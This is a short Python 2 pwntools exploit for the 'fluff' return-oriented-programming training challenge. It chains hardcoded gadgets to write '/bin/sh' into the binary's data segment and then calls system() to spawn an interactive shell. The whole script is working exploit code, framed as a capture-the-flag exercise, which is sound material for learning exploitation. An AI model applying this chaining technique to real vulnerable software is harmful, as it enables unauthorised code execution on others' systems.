#!/usr/bin/env python2

import pwn

t = pwn.process("./fluff")

pwn.gdb.attach(t)

popRDI = 0x4008c3 # pop rdi; ret;
clearR11 = 0x400822 #xor r11, r11; pop r14; mov edi, junk; ret;
xorGadget = 0x40082f # xor r11, r12; pop r12; mov r13d, junk; ret;
xchg = 0x400840 # xchg r11, r10; pop r15; mov r11d, junk; ret;
writeGadget = 0x40084e #mov qword [r10], r11; pop r13; pop r12; xor byte [r10], r12b; ret;
popR12 = 0x400832 # pop r12; mov r13d, junk; ret;
data_seg = 0x6010d0
system_plt = 0x4005e0

buf = 'h'*40

#writing the data I want in r10 for the writeGadget into r12 -> r11 which finally will go to r10
buf += pwn.p64(popR12)
buf += pwn.p64(data_seg)
buf += pwn.p64(clearR11)  #clearing r11
buf += 'junkjunk'         #pop'ed into r14 as a side effect of clearing r11, r14's value doesn't matter
buf += pwn.p64(xorGadget)
buf += '/bin/sh\x00'  # there is a pop r12 after the xor so I dont have to pop r12 again.
buf += pwn.p64(xchg)  # r10 now has data_seg value and is ready for writeGadget
buf += 'junkjunk'    # r15 doesn't matter


#clear r11 to xor with r12 which already has the value I want in r11
buf += pwn.p64(clearR11)
buf += 'junkjunk'   #r14 doesn't matter
buf += pwn.p64(xorGadget)
buf += 'junkjunk'   #I don't care about r12 anymore

#use wrtieGadget to write '/bin/sh\x00' into data_seg
buf += pwn.p64(writeGadget)
buf += 'junkjunk'   #r13 doesn't matter
buf += pwn.p64(0)   #r12 needs to be zero for the xor in the last part of the writeGadget


#call system with /bin/sh as argument
buf += pwn.p64(popRDI)
buf += pwn.p64(data_seg)
buf += pwn.p64(system_plt)

t.sendline(buf)
t.interactive()
